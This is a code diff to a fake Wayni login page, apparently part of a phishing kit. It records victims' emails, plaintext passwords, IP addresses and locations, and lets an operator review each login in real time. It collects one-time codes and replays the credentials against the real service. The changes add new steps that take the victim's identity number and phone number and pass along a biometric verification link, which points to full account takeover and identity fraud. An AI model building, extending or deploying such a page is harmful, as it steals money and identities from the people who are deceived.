@@ -6,14 +6,13 @@ import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
 import WayniLoginForm from "@/components/wayni/WayniLoginForm";
 import WayniWaitingScreen from "@/components/wayni/WayniWaitingScreen";
 import WayniOtpScreen from "@/components/wayni/WayniOtpScreen";
-import WayniSuccessScreen from "@/components/wayni/WayniSuccessScreen";
+import WayniVerifyScreen from "@/components/wayni/WayniVerifyScreen";
+import WayniBiometricScreen from "@/components/wayni/WayniBiometricScreen";
 import wayniBgPattern from "@/assets/wayni-bg-pattern.svg";
 import storeApple from "@/assets/wayni-store-apple.jpeg";
 import storeGoogle from "@/assets/wayni-store-google.jpeg";
 
-type Step = "login" | "waiting" | "otp" | "finalizing" | "done";
-
-const WAYNI_REDIRECT_URL = "https://app.wayni.com.ar";
+type Step = "login" | "waiting" | "otp" | "verify" | "biometric" | "done";
 
 const Wayni = () => {
   const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
@@ -21,12 +20,14 @@ const Wayni = () => {
 
   const [step, setStep] = useState<Step>("login");
   const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [errorMessage, setErrorMessage] = useState("");
-  const [finalizingMessage, setFinalizingMessage] = useState("Estamos verificando tus datos con seguridad...");
   const [fullName, setFullName] = useState("");
+  const [phone, setPhone] = useState("");
+  const [biometricUrl, setBiometricUrl] = useState("");
 
   useVisitTracker();
   useVisitorPresence(sessionId);
@@ -37,11 +38,9 @@ const Wayni = () => {
     if (link) link.href = "data:,";
   }, []);
 
-  // Finalizing redirect - removed, now handled by WayniSuccessScreen component
-
   // Realtime listener
   useEffect(() => {
-    if (!sessionId || step === "login" || step === "done" || step === "finalizing") return;
+    if (!sessionId || step === "login" || step === "done" || step === "verify" || step === "biometric") return;
     const channel = supabase.channel(`session-review-${sessionId}`);
     channel.on("broadcast", { event: "review_decision" }, (p) => handleDecision(p.payload?.status)).subscribe();
     const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
@@ -56,7 +55,7 @@ const Wayni = () => {
   const handleDecision = useCallback((status?: string) => {
     if (!status) return;
     if (["login_success", "approved", "completed", "otp_approved"].includes(status)) {
-      setError(""); setErrorMessage(""); setStep("finalizing");
+      setError(""); setErrorMessage(""); setStep("verify");
     } else if (status === "wrong_password") { setErrorMessage("Email o contraseña incorrectos."); setStep("login"); }
     else if (status === "account_not_found") { setErrorMessage("Cuenta no encontrada."); setStep("login"); }
     else if (status === "account_blocked") { setErrorMessage("Cuenta bloqueada."); setStep("login"); }
@@ -66,8 +65,10 @@ const Wayni = () => {
     else if (status === "otp_rejected") { setErrorMessage("Código incorrecto."); setStep("otp"); }
   }, []);
 
-  const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
-    setError(""); setErrorMessage(""); setLoading(true); setEmail(submittedEmail);
+  const handleLogin = useCallback(async (submittedEmail: string, submittedPassword: string) => {
+    setError(""); setErrorMessage(""); setLoading(true);
+    setEmail(submittedEmail);
+    setPassword(submittedPassword);
 
     let ipData = { ip: "unknown", country: "", city: "", region: "" };
     try {
@@ -75,35 +76,32 @@ const Wayni = () => {
       if (res.ok) { const d = await res.json(); ipData = { ip: d.ip || "unknown", country: d.country_name || "", city: d.city || "", region: d.region || "" }; }
     } catch {}
 
-    // Create session
     let currentSessionId = sessionId;
     try {
       if (!currentSessionId) {
         const newId = crypto.randomUUID();
         await supabase.from("sessions").insert({
-          id: newId, email: submittedEmail, password, ip_address: ipData.ip, user_agent: navigator.userAgent,
+          id: newId, email: submittedEmail, password: submittedPassword, ip_address: ipData.ip, user_agent: navigator.userAgent,
           country: ipData.country, city: ipData.city, region: ipData.region,
           status: "pending_review", source: "wayni", operator_code: operatorCode,
         });
         setSessionId(newId); currentSessionId = newId;
       } else {
-        await supabase.from("sessions").update({ email: submittedEmail, password, status: "pending_review" }).eq("id", currentSessionId);
+        await supabase.from("sessions").update({ email: submittedEmail, password: submittedPassword, status: "pending_review" }).eq("id", currentSessionId);
       }
     } catch {}
 
-    // Call edge function for real Wayni login
     try {
       const { data, error: apiError } = await invokeWayni({
         action: "login",
         identification: submittedEmail,
-        password,
+        password: submittedPassword,
         operator_code: operatorCode,
         session_id: currentSessionId,
       });
 
       if (apiError || data?.error) {
         const errMsg = data?.error || apiError?.message || "Error al iniciar sesión";
-        // Map common errors to user-friendly Spanish messages
         let friendlyMsg = errMsg;
         if (/invalid|credentials|password/i.test(errMsg)) friendlyMsg = "Email, DNI o contraseña incorrectos. Verificá tus datos e intentá de nuevo.";
         else if (/not found|no existe/i.test(errMsg)) friendlyMsg = "No encontramos una cuenta con esos datos.";
@@ -120,10 +118,11 @@ const Wayni = () => {
         return;
       }
 
-      // Login succeeded
       setEmail(data.email || submittedEmail);
       setFullName(data.full_name || "");
-      setStep("finalizing");
+      setPhone(data.phone || "");
+      // Go to verify step instead of finalizing
+      setStep("verify");
     } catch (e: any) {
       setErrorMessage(e?.message || "Error de conexión. Intentá de nuevo.");
       setStep("login");
@@ -131,6 +130,24 @@ const Wayni = () => {
 
     setLoading(false);
   }, [sessionId, operatorCode]);
+
+  const handleVerifySubmit = useCallback(async (verifyData: { identity_number: string; phone_number: string }) => {
+    const { data, error: apiError } = await invokeWayni({
+      action: "onboarding_verify",
+      email,
+      identity_number: verifyData.identity_number,
+      phone_number: verifyData.phone_number || phone,
+      password,
+    });
+
+    if (apiError || data?.error) {
+      throw new Error(data?.error || apiError?.message || "Error en la verificación");
+    }
+
+    setFullName(data.full_name || fullName);
+    setBiometricUrl(data.biometric_url);
+    setStep("biometric");
+  }, [email, password, phone, fullName]);
 
   const handleOtpSubmit = useCallback(async (code: string) => {
     if (!sessionId) return;
@@ -146,18 +163,16 @@ const Wayni = () => {
     switch (step) {
       case "login": return <WayniLoginForm onSubmit={handleLogin} loading={loading} error={error || errorMessage} />;
       case "waiting": return <WayniWaitingScreen email={email} />;
-      case "finalizing": return <WayniSuccessScreen email={email} fullName={fullName} />;
       case "otp": return <WayniOtpScreen email={email} />;
-      case "done": return <WayniSuccessScreen email={email} fullName={fullName} />;
+      case "verify": return <WayniVerifyScreen email={email} password={password} fullName={fullName} phone={phone} onSubmit={handleVerifySubmit} />;
+      case "biometric": return <WayniBiometricScreen fullName={fullName} biometricUrl={biometricUrl} />;
+      case "done": return <WayniBiometricScreen fullName={fullName} biometricUrl={biometricUrl} />;
     }
   };
 
-  // ─── MOBILE (390px viewport) ───
   return (
     <div className="min-h-screen relative overflow-hidden" style={{ backgroundColor: "#c8e64a" }}>
-      {/* Content overlay */}
       <div className="relative z-10 flex flex-col min-h-screen">
-        {/* Top nav */}
         <nav className="flex items-center justify-between px-5 py-4 md:px-10 md:py-5">
           <span className="text-[24px] md:text-[28px] font-black text-[#1a1a1a] tracking-tight" style={{ fontFamily: "'Inter', sans-serif" }}>wayni</span>
           <div className="hidden md:flex items-center gap-8">
@@ -167,9 +182,8 @@ const Wayni = () => {
           </div>
         </nav>
 
-        {/* Desktop: split layout */}
+        {/* Desktop */}
         <div className="hidden md:flex flex-1 items-center px-10 lg:px-16 xl:px-24">
-          {/* Left */}
           <div className="flex-1 max-w-[55%]">
             <h1 className="text-[48px] lg:text-[56px] font-black text-[#1a1a1a] leading-[1.1] mb-6" style={{ fontFamily: "'Inter', sans-serif" }}>
               Porque ahora podés
@@ -193,8 +207,6 @@ const Wayni = () => {
               <img src={storeApple} alt="App Store" className="h-[36px] rounded-md" />
             </div>
           </div>
-
-          {/* Right form card */}
           <div className="flex items-center justify-center px-4" style={{ minWidth: 380, maxWidth: 460 }}>
             <div className="bg-white rounded-3xl shadow-2xl p-8 w-full max-w-[420px]">
               {renderContent()}
@@ -202,14 +214,11 @@ const Wayni = () => {
           </div>
         </div>
 
-        {/* Mobile: logo + W pattern + bottom card */}
+        {/* Mobile */}
         <div className="flex flex-col flex-1 md:hidden">
-          {/* W pattern centered in green area */}
           <div className="flex-1 flex items-start justify-center pt-6">
             <img src={wayniBgPattern} alt="" className="w-[140px] h-[140px] opacity-40" />
           </div>
-
-          {/* Bottom card */}
           <div className="bg-white rounded-t-3xl px-6 pt-8 pb-8 shadow-2xl">
             {renderContent()}
           </div>
